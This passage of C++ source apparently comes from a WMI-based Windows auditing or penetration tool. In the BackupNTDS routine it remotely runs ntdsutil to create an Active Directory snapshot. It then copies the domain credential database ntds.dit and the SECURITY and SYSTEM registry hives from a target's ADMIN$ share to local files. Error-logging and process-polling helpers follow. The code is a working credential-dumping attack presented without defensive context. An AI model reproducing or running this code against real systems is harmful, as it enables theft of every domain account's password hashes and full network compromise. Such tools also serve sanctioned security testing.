				MultiByteToWideChar( CP_ACP, 0, szCommandLine, strlen( szCommandLine ) + 1, wszCommandLine, sizeof( wszCommandLine ) / sizeof( wszCommandLine[0] ) );

				bszCommandLine = SysAllocString( wszCommandLine );

				vtCommandLine.vt      = VT_BSTR;
				vtCommandLine.bstrVal = bszCommandLine;

				pOutParams = NULL;

				hResult = pClassInstance->Put( L"CommandLine", 0, &vtCommandLine, 0 );

				hResult = pService->ExecMethod( bszClassName, bszMethodName, NULL, NULL, pClassInstance, &pOutParams, NULL );

				if ( SUCCEEDED( hResult ) )
				{
					pOutParams->Release();
				}

				VariantClear( &vtCommandLine );

				SysFreeString( bszCommandLine );

				strcpy( szCommandLine, "cmd.exe /c ntdsutil \"ac i ntds\" \"ifm\" \"create full %SystemRoot%\\WMIDump\" q q" );

				MultiByteToWideChar( CP_ACP, 0, szCommandLine, strlen( szCommandLine ) + 1, wszCommandLine, sizeof( wszCommandLine ) / sizeof( wszCommandLine[0] ) );

				bszCommandLine = SysAllocString( wszCommandLine );

				vtCommandLine.vt      = VT_BSTR;
				vtCommandLine.bstrVal = bszCommandLine;

				pOutParams = NULL;

				hResult = pClassInstance->Put( L"CommandLine", 0, &vtCommandLine, 0 );

				hResult = pService->ExecMethod( bszClassName, bszMethodName, NULL, NULL, pClassInstance, &pOutParams, NULL );

				if ( SUCCEEDED( hResult ) )
				{
					hResult = pOutParams->Get( L"ProcessId", 0, &vtResult, NULL, 0 );

					if ( SUCCEEDED( hResult ) && vtResult.uintVal != NULL )
					{
						dwProcessID = vtResult.uintVal;

						j = 0;

						while ( j < 20 )
						{
							bResult = IsProcessRunning( szTarget, pService, authIdentity, bImpersonate, &dwProcessID, bMultipleHosts );

							if ( !bResult )
							{
								break;
							}

							Sleep( 1000 );
						}

						if ( !*bMultipleHosts )
						{
							if ( i == 0 )
							{
								printf( "\n" );
								printf( "+++++++++++++++++++++++++++++++++++++++++++++++++++\n" );
								printf( "+++++               BACKUP NTDS               +++++\n" );
								printf( "+++++++++++++++++++++++++++++++++++++++++++++++++++\n" );
								printf( "\n" );

								i++;
							}

							printf( "Saving NTDS Backup:   \\\\%s\\ADMIN$\\WMIDump\\Active Directory\\ntds.dit\n", szTarget );
							printf( "Saving Registry Hive: \\\\%s\\ADMIN$\\WMIDump\\registry\\SECURITY\n", szTarget );
							printf( "Saving Registry Hive: \\\\%s\\ADMIN$\\WMIDump\\registry\\SYSTEM\n", szTarget );

							printf( "\n" );

							fflush( stdout );
						}

						sprintf( szSaveFilePathSrc, "\\\\%s\\ADMIN$\\WMIDump\\Active Directory\\ntds.dit", szTarget );
						sprintf( szSaveFilePathDest, "Reports\\%s-ntds.dit", szTarget );

						DeleteFile( szSaveFilePathDest );

						bResult = MoveFile( szSaveFilePathSrc, szSaveFilePathDest );

						if ( !bResult )
						{
							strcpy( szFunction, "MoveFile (BackupNTDS)" );

							WriteLastErrorToErrorLog( szTarget, szFunction, (DWORD *)&hResult, bMultipleHosts );
						}

						sprintf( szSaveFilePathSrc, "\\\\%s\\ADMIN$\\WMIDump\\registry\\SECURITY", szTarget );
						sprintf( szSaveFilePathDest, "Reports\\%s-SECURITY", szTarget );

						DeleteFile( szSaveFilePathDest );

						bResult = MoveFile( szSaveFilePathSrc, szSaveFilePathDest );

						if ( !bResult )
						{
							strcpy( szFunction, "MoveFile (BackupNTDS)" );

							WriteLastErrorToErrorLog( szTarget, szFunction, (DWORD *)&hResult, bMultipleHosts );
						}

						sprintf( szSaveFilePathSrc, "\\\\%s\\ADMIN$\\WMIDump\\registry\\SYSTEM", szTarget );
						sprintf( szSaveFilePathDest, "Reports\\%s-SYSTEM", szTarget );

						DeleteFile( szSaveFilePathDest );

						bResult = MoveFile( szSaveFilePathSrc, szSaveFilePathDest );

						if ( !bResult )
						{
							strcpy( szFunction, "MoveFile (BackupNTDS)" );

							WriteLastErrorToErrorLog( szTarget, szFunction, (DWORD *)&hResult, bMultipleHosts );
						}
					}

					VariantClear( &vtResult );

					pOutParams->Release();
				}
				else
				{
					strcpy( szFunction, "ExecMethod (BackupNTDS)" );

					WriteLastErrorToErrorLog( szTarget, szFunction, (DWORD *)&hResult, bMultipleHosts );
				}

				VariantClear( &vtCommandLine );

				SysFreeString( bszCommandLine );

				pClassInstance->Release();
			}
			else
			{
				strcpy( szFunction, "SpawnInstance (BackupNTDS)" );

				WriteLastErrorToErrorLog( szTarget, szFunction, (DWORD *)&hResult, bMultipleHosts );
			}

			pInParams->Release();
		}
		else
		{
			strcpy( szFunction, "GetMethod (BackupNTDS)" );

			WriteLastErrorToErrorLog( szTarget, szFunction, (DWORD *)&hResult, bMultipleHosts );
		}

		pClass->Release();
	}
	else
	{
		strcpy( szFunction, "GetObject (BackupNTDS)" );

		WriteLastErrorToErrorLog( szTarget, szFunction, (DWORD *)&hResult, bMultipleHosts );
	}

	SysFreeString( bszClassName );
	SysFreeString( bszMethodName );
}

BOOL IsProcessRunning( CHAR szTarget[], IWbemServices *pService, COAUTHIDENTITY *authIdentity, BOOL *bImpersonate, DWORD *dwProcessID, BOOL *bMultipleHosts )
{
	BOOL                          bResult;
	CHAR                  szQueryLanguage[ 128 ];
	CHAR                          szQuery[ 128 ];
	WCHAR                wszQueryLanguage[ 256 ];
	WCHAR                        wszQuery[ 256 ];
	BSTR                 bszQueryLanguage;
	BSTR                         bszQuery;
	IEnumWbemClassObject     *pEnumerator;
	HRESULT                       hResult;
	IWbemClassObject             *pObject;
	ULONG                       uReturned;
	VARIANT                    vtProperty;
	CHAR                       szFunction[ 128 ];

	bResult = FALSE;

	strcpy( szQueryLanguage, "WQL" );

	sprintf( szQuery, "Select * from Win32_Process Where ProcessId = %d", *dwProcessID );

	MultiByteToWideChar( CP_ACP, 0, szQueryLanguage, strlen( szQueryLanguage ) + 1, wszQueryLanguage, sizeof( wszQueryLanguage ) / sizeof( wszQueryLanguage[0] ) );
	MultiByteToWideChar( CP_ACP, 0, szQuery, strlen( szQuery ) + 1, wszQuery, sizeof( wszQuery ) / sizeof( wszQuery[0] ) );

	bszQueryLanguage = SysAllocString( wszQueryLanguage );
	bszQuery         = SysAllocString( wszQuery );

	pEnumerator = NULL;

	hResult = pService->ExecQuery( bszQueryLanguage, bszQuery, WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY, NULL, &pEnumerator );

	if ( SUCCEEDED( hResult ) )
	{
		if ( *bImpersonate )
		{
			hResult = CoSetProxyBlanket( pEnumerator, RPC_C_AUTHN_DEFAULT, RPC_C_AUTHZ_DEFAULT, COLE_DEFAULT_PRINCIPAL, RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE );
		}
		else
		{
			hResult = CoSetProxyBlanket( pEnumerator, RPC_C_AUTHN_DEFAULT, RPC_C_AUTHZ_DEFAULT, COLE_DEFAULT_PRINCIPAL, RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_IMP_LEVEL_IMPERSONATE, authIdentity, EOAC_NONE );
		}

		while ( pEnumerator )
		{
			pObject = NULL;

			hResult = pEnumerator->Next( WBEM_INFINITE, 1, &pObject, &uReturned );

			if ( SUCCEEDED( hResult ) )
			{
				if ( uReturned == 0 )
				{
					break;
				}

				hResult = pObject->Get( L"Name", 0, &vtProperty, NULL, NULL );
				
				if ( SUCCEEDED( hResult ) && vtProperty.bstrVal != NULL )
				{
					bResult = TRUE;
				}

				VariantClear( &vtProperty );

				pObject->Release();
			}
		}
	}
	else
	{
		strcpy( szFunction, "ExecQuery (IsProcessRunning)" );

		WriteLastErrorToErrorLog( szTarget, szFunction, (DWORD *)&hResult, bMultipleHosts );
	}

	SysFreeString( bszQueryLanguage );
	SysFreeString( bszQuery );

	return bResult;
}

VOID WriteLastErrorToErrorLog( CHAR szTarget[], CHAR szFunction[], DWORD *dwResult, BOOL *bMultipleHosts )
{
	DWORD     dwReturn;
	CHAR    szErrorMsg[ 128 ];
	CHAR     *pNewLine;
	FILE  *pOutputFile;

	dwReturn = FormatMessage( FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS, NULL, *dwResult, MAKELANGID( LANG_NEUTRAL, SUBLANG_DEFAULT ), szErrorMsg, sizeof( szErrorMsg ), NULL );

	if ( dwReturn > 0 )
	{
		pNewLine = strchr( szErrorMsg, '\r' );

		if ( pNewLine != NULL )
		{
			*pNewLine = '\0';
		}

		pNewLine = strchr( szErrorMsg, '\n' );

		if ( pNewLine != NULL )
		{
			*pNewLine = '\0';
		}
	}
	else
	{
		strcpy( szErrorMsg, "Unknown error occurred." );
	}

	if ( !*bMultipleHosts )
	{
		fprintf( stderr, "ERROR! %s - %s\n", szFunction, szErrorMsg );

		fflush( stderr );
	}

	WaitForSingleObject( hSemaphore, INFINITE );

	pOutputFile = fopen( "Reports\\ErrorLog.txt", "r" );

	if ( pOutputFile != NULL )
	{
		fclose( pOutputFile );
	}
	else
	{
		pOutputFile = fopen( "Reports\\ErrorLog.txt", "w" );

		if ( pOutputFile != NULL )
		{
			fprintf( pOutputFile, "NOTE: This file is tab separated. Open with Excel to view and sort information.\n" );
			fprintf( pOutputFile, "\n" );
			fprintf( pOutputFile, "Hostname\tFunction Name\tError Number\tError Message\n" );

			fclose( pOutputFile );
		}
	}

	pOutputFile = fopen( "Reports\\ErrorLog.txt", "a+" );

	if ( pOutputFile != NULL )
	{
		fprintf( pOutputFile, "%s\t%s\t%d\t%s\n", szTarget, szFunction, *dwResult, szErrorMsg );

		fclose( pOutputFile );
	}

	ReleaseSemaphore( hSemaphore, 1, NULL );
}

VOID WriteToErrorLog( CHAR szTarget[], CHAR szFunction[], CHAR szErrorMsg[], BOOL *bMultipleHosts )
{
	FILE *pOutputFile;

	if ( !*bMultipleHosts )
	{
		fprintf( stderr, "ERROR! %s - %s\n", szFunction, szErrorMsg );

		fflush( stderr );
	}

	WaitForSingleObject( hSemaphore, INFINITE );

	pOutputFile = fopen( "Reports\\ErrorLog.txt", "r" );

	if ( pOutputFile != NULL )
	{
		fclose( pOutputFile );
	}
	else
	{
		pOutputFile = fopen( "Reports\\ErrorLog.txt", "w" );

		if ( pOutputFile != NULL )
		{
			fprintf( pOutputFile, "NOTE: This file is tab separated. Open with Excel to view and sort information.\n" );
			fprintf( pOutputFile, "\n" );
			fprintf( pOutputFile, "Hostname\tFunction Name\tError Number\tError Message\n" );

			fclose( pOutputFile );
		}
	}

	pOutputFile = fopen( "Reports\\ErrorLog.txt", "a+" );

	if ( pOutputFile != NULL )
	{
		fprintf( pOutputFile, "%s\t%s\t-\t%s\n", szTarget, szFunction, szErrorMsg );

		fclose( pOutputFile );
	}

	ReleaseSemaphore( hSemaphore, 1, NULL );
}

// Written by Reed Arvin | reedlarvin@gmail.com
